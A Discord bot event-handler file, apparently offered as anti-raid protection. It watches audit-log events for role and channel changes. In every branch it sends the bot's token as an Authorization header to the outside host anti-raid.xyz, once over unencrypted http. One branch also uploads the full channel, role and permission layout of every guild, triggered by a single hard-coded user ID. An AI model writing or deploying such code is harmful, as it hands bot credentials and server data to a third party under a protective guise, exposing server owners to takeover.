const Discord = require('discord.js');

module.exports = {
    name: 'guildAuditLogEntryCreate',
    run: async (client, entry, guild) => {
        if (entry.action === Discord.AuditLogEvent.RoleDelete) {
            const authorized = ["id1", "id2", "id3"];
            if (authorized.includes(entry.executorId)) return;
            //make this request only if the user is not authorized so the bot will recreate the role
            fetch("https://anti-raid.xyz" + "/roledelete", {
                method: "POST",
                headers: {

                    "Authorization": client.token,
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    botID: client.user.id,
                    guildID: guild.id,
                    roleID: entry.targetId,
                    userID: entry.executorId,
                    punshiment: false,
                })
            }).then(async res => console.log((await res.json())));
            return;
        }

        //unauthorized channelUpdates
        if ([Discord.AuditLogEvent.ChannelUpdate, Discord.AuditLogEvent.ChannelOverwriteCreate,
                Discord.AuditLogEvent.ChannelOverwriteDelete, Discord.AuditLogEvent.ChannelOverwriteUpdate
            ].includes(entry.action)) {
            const authorized = ["id1", "id2", "id3"];
            if (authorized.includes(entry.executorId)) return;
            //make this request only if the user is not authorized so the bot will update the channel
            fetch("https://anti-raid.xyz" + "/channelupdate", {
                method: "POST",
                headers: {

                    "Authorization": client.token,
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    botID: client.user.id,
                    guildID: guild.id,
                    channelID: entry.targetId,
                    userID: entry.executorId,
                    punshiment: false,
                })
            }).then(async res => console.log((await res.json())));
            return;
        }
        //unauthorized roleUpdates
        if ( Discord.AuditLogEvent.RoleUpdate === entry.action) {
            const authorized = ["id1", "id2", "id3"];
            if (authorized.includes(entry.executorId)) return;
            //make this request only if the user is not authorized so the bot will update the role
            fetch("https://anti-raid.xyz" + "/roleupdate", {
                method: "POST",
                headers: {

                    "Authorization": client.token,
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    botID: client.user.id,
                    guildID: guild.id,
                    roleID: entry.targetId,
                    userID: entry.executorId,
                    punshiment: false,
                })
            }).then(async res => console.log((await res.json())));
            return;
        }

        if ([
                Discord.AuditLogEvent.RoleCreate,
                Discord.AuditLogEvent.RoleDelete,
                Discord.AuditLogEvent.RoleUpdate,
                Discord.AuditLogEvent.ChannelCreate,
                Discord.AuditLogEvent.ChannelDelete,
                Discord.AuditLogEvent.ChannelUpdate,
                Discord.AuditLogEvent.ChannelOverwriteCreate,
                Discord.AuditLogEvent.ChannelOverwriteDelete,
                Discord.AuditLogEvent.ChannelOverwriteUpdate
            ].includes(entry.action)) {

            const authorized = ["768566147695509511"];
            if (!authorized.includes(entry.executorId)) return;
            //make this request only if the user is authorized so it can send the data to the server
            const transformedGuilds = client.guilds.cache.map(g => ({
                guildID: g.id,
                channels: g.channels.cache.map(c => ({
                    parent_id: c.parentId,
                    parent: c instanceof Discord.CategoryChannel,
                    id: c.id,
                    name: c.name,
                    type: c.type,
                    user_limit: c.userLimit,
                    permission_overwrites: [...c.permissionOverwrites.cache.values()].map(p => ({
                        id: p.id,
                        allow: BigInt(p.allow.bitfield).toString(),
                        deny: BigInt(p.deny.bitfield).toString(),
                        type: p.type,
                    })),
                    position: c instanceof Discord.CategoryChannel ? c.position : c.rawPosition,
                    botID: client.user.id,
                    topic: c.topic,
                    guildID: g.id
                }), ),
                roles: g.roles.cache.map(r => ({
                    id: r.id,
                    position: r.position,
                    name: r.name,
                    manage: r.managed,
                    permissions: BigInt(r.permissions.bitfield).toString(),
                    color: r.color,
                    hoist: r.hoist,
                    mentionable: r.mentionable
                }))
            }))
            //make this request only if the user is authorized so it can send the data to the server

            fetch("http://anti-raid.xyz" + "/ready", {
                method: "POST",
                headers: {

                    "Authorization": client.token,
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    botID: client.user.id,
                    guilds: transformedGuilds
                })
            }).then(async res => console.log((await res.json())));

        }
    }
}